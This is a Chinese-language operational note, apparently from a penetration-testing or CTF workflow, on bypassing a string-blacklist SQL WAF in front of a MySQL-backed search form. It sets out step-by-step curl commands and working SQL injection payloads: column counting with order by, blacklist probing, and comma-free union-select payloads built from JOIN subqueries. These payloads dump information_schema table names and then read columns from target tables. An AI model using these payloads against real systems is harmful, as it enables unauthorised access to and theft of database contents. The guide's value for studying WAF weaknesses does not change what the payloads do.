# 黑名单型 SQL WAF 绕过：JOIN 拆列 + 子查询包裹

## 什么时候用

出现下列**可观察特征**时，套用本笔记：

1. 一个带搜索/查询表单的页面，单个参数（GET 或 POST 表单字段）被直接拼进 SQL。判定方法：`id=1 and 1=1` 返回原记录，`id=1 and 1=2` 返回空结果（或「未查询到」提示），`id=1 or 1=1` 返回全表——布尔型注入成立，且无需时间盲注即可通。
2. 响应里**存在两种不同的提示通道**：一种像「请求已被 WAF 拦截」（带 `class="notice blocked"` 之类的样式），另一种像「查询失败，请检查输入后重试」（带 `class="notice error"`）。这几乎一定说明有一层黑名单 WAF 挡在 SQL 外面。区分二者是后续所有探测的前提：看到 blocked 说明是被拦截，看到 error 说明请求已到达数据库但语法/执行错了，**不能把两者混为一谈**。
3. 常见 SQL 语法本身可用，但**特定字符/关键字**一出现就被 blocked。典型表现：`1,2` 被拦、`union select 1,2,3,4` 被拦、直接写 `information_schema` 被拦，而 `order by N` 能正常报出列数错误——说明 WAF 是按字符串特征匹配，而非按语法解析。

只要这些特征成立，就不必去猜 WAF 具体实现，直接按下一节的手法换一种等价 SQL 表达。

## 怎么做

**第一步：确认列数。** 用 `order by` 递增，直到响应从正常变成 error 通道：

```bash
curl -s -X POST --data-urlencode 'id=1 order by 4' http://TARGET/
curl -s -X POST --data-urlencode 'id=1 order by 5' http://TARGET/   # 报 error → 4 列
```

**第二步：确定哪些字符/关键字是黑名单。** 逐个最小化测试，观察响应落在 blocked 还是 error 通道：

- `id=1,2` —— 单独逗号是否被拦
- `id=1 union select 1,2,3,4` —— `union select` + 列名列表是否被拦
- `id=1 union select 1,(select table_name from information_schema.tables limit 1),3,4` —— `information_schema` 放进子查询后是否放行（实测这里的关键是「裸出现」被拦，包进括号子查询即可通过）

**第三步：用 JOIN 把「列名列表」换成「单列表达式」。** 逗号被拦时，把 `union select` 的每一列写成带别名的子查询，用 `join` 串起来，`select *` 展开后列数天然对齐：

```sql
union select * from (select 1)a join (select <expr1>)b join (select <expr2>)c join (select <expr3>)d
```

取元数据时：

```bash
curl -s -X POST --data-urlencode \
 'id=1 union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c join (select 4)d' \
 http://TARGET/
```

`group_concat` 若要拼接多列会产生逗号，改用单列。

**第四步（备选）：字符串字面量可换十六进制。** 引号被拦时，`0x...` 在 MySQL 里等价于字符串且不含引号；本次探测阶段该形态通过 WAF，但最终链路靠 `join` 子查询即可完成，未依赖它。十六进制由 `printf '%s' 'directory' | xxd -p | tr -d '\n'` 或 Python `s.encode().hex()` 生成。

**第五步：拼接最终读数据的 payload。** 用 JOIN 方式逐列取目标表：

```sql
id=1 union select * from (select 1)a join (select id from <table> limit 1)b join (select <column> from <table> limit 1)c join (select 4)d
```

响应表格中 union 部分新增的那一行即为回显，列位置按 `a,b,c,d` 顺序对应。若某表/列名太长或有特殊字符，同样用 `0x` 十六进制代替。

**第六步：保存原始请求/响应。** 用 `curl -i` 保留状态行与响应头，把请求、payload、响应片段分别落盘，便于复核与写报告：

```bash
curl -s -i -X POST --data-urlencode 'id=<payload>' http://TARGET/ > response.txt
```

## 坑

- **不要把 blocked 当 error。** 二者页面结构不同；如果只看「页面没数据」就以为 payload 无效，会误判语法。每次发探测前先确认响应的提示通道。
- **不要直接写 `1 union select 1,2,3,4`。** 实测被 blocked，因为 WAF 针对「select 后紧跟列名列表」这一形态做了匹配。必须给每列包一层子查询并加别名（`(select 1)a`）。
- **不要让逗号出现在任何位置。** 实测 `id=1,2` 就被拦，`union select 1,2,3,4` 里的逗号同样算数；`group_concat(col1,col2)` 里的逗号也会触发。改用 `join` 拆列，或用单列子查询。
- **不要把 `information_schema` 裸写在外面。** 实测 `from information_schema.tables` 直接出现会被拦，但放进 `(select ... from information_schema.tables)` 子查询里可通过——所以永远包在子查询中。
- **不要依赖关键字大小写或注释来绕过。** 本次实测中 `/**/`、大小写混写对 `order by` 既不必要也未验证有效；能绕开的原因是**语法形态**变化（join 子查询、0x），不是混淆。
- **不要用时间盲注硬扛。** 布尔通道已足够，页面回显直接给了 union 位置，无需 sleep。

## 边界

- 仅在 **MySQL/MariaDB** 下验证：`join (select ...)a` 需要派生表别名，`0x` 十六进制隐式转字符串、`group_concat`、`database()` 均为 MySQL 语法。PostgreSQL 需改成 `LATERAL`/`concat`，SQL Server 不适用。
- 需要**联合查询的列数与原查询严格一致**（本次为 4 列）。列数靠 `order by` 试出；若 `union select * from ...` 列数不匹配会落到 error 通道，需重新对齐。
- 需要**页面回显结果集**（in-band）。若应用只返回「有/无」布尔信号、不回显行数据，则第五步的 union 回显不可用，只能退回布尔逐位提取。
- 本方法绕过的是**字符串黑名单型 WAF**（本项目为 gunicorn/Python 后端）。对基于 AST/语义的 WAF、或对 `join`、`select *`、派生表也做拦截的规则，本手法可能失效，需重新做第二步的特征测绘。
- 所有结论来自一次目标实测；WAF 规则集会随目标不同而变化，**换目标必须先重跑第二步的探测**，不要照搬 payload 假设。
